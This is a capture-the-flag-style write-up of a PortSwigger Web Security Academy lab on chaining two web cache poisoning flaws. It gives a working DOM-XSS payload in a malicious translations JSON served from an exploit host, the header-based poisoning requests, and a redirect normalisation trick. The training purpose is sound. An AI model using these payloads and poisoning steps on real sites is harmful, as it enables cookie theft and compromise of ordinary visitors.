# Web Cache Poisoning Lab 11 — Combining web cache poisoning vulnerabilities — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** Web Cache Poisoning
**Lab:** Combining web cache poisoning vulnerabilities
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~06:30 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed
**Instance:** https://0a9000c1036b82128138c5390073008f.web-security-academy.net/
**Exploit server:** https://exploit-0a0700bf031682738149c41a012b00f5.exploit-server.net

## Vulnerability Type

Two web cache poisoning vulnerabilities chained together: (1) the unkeyed `X-Forwarded-Host` header makes the page import its translations JSON from an attacker host, where a DOM-XSS in `initTranslations()` executes the payload; (2) the unkeyed `X-Original-URL` header forces a cacheable 302 redirect to `/setlang/es`, switching every visitor to the poisoned Spanish page.

## Solution

1. Stored the exploit file on the lab's exploit server at `/resources/json/translations.json` (head: `Content-Type: application/json` + `Access-Control-Allow-Origin: *`; body below — the `View details` translation carries the payload, and the other translations are kept intact so the JSON stays valid):
   ```json
   { "en": { "name": "English" }, "es": { "name": "español", "translations": { "Return to list": "Volver a la lista", "View details": "</a><img src=1 onerror='alert(document.cookie)' />", "Description:": "Descripción" } } }
   ```
2. **Poison A — the Spanish page.** `GET /?localized=1` with cookie `lang=es` and `X-Forwarded-Host: exploit-0a0700bf031682738149c41a012b00f5.exploit-server.net` made the page's `data.host` point at the exploit server, so its `translations.json` import comes from there.
3. **Poison B — force everyone to Spanish.** The victim's language is English, and the English page is not vulnerable (its translations are handled safely). `GET /` with `X-Original-URL: /setlang\es` triggers a cacheable 302 to `/setlang/es` (the backslash is normalised to a forward slash by the app's redirect; a plain `/setlang/es` would set a cookie and not be cacheable). The cached 302 switches every visitor to Spanish.
4. Replayed A then B in sequence every ~5 seconds until both entries were poisoned at the same time; the victim was redirected to the Spanish page, the malicious translations loaded, and the home page showed "Congratulations, you solved the lab!"

Full solver: `~/workspace/scripts/ps-cache-poisoning.py` (Lab 11).

## Practical Explanation

- **Why two poisons are needed:** the XSS only fires for non-English languages, but the victim uses English. Poison A alone would only hurt Spanish users; poison B alone only changes language. Together, B delivers every visitor to the page A poisoned.
- **Why the backslash trick works:** requesting `/setlang/es` directly returns a `Set-Cookie` response, which the cache will not store. `X-Original-URL: /setlang\es` makes the app issue a 302 to `/setlang/es` instead — and 302s *are* cacheable — so the redirect itself becomes the poison.
- **Why the timing is tight:** both poisons must be live simultaneously (each entry expires after ~30 seconds), so the solver replays A+B as a pair in every loop iteration.
- **Why the JSON needs `Access-Control-Allow-Origin: *`:** the translations are loaded with `fetch()`, so a cross-origin JSON without that header is blocked by CORS (same lesson as Lab 10).

## Lessons Learned

- Real cache-poisoning attacks are often *chains*: one poison to plant the payload, another to steer victims onto the poisoned page.
- A vulnerability that looks unexploitable ("only affects Spanish users") becomes critical once you can change the victim's state (here, their language) through the cache.
- Backslash/forward-slash normalisation is a reliable way to turn a non-cacheable response into a cacheable redirect.
- Keep the rest of a poisoned JSON file valid — replacing one value with the payload while preserving the structure avoids breaking the page before the payload runs.
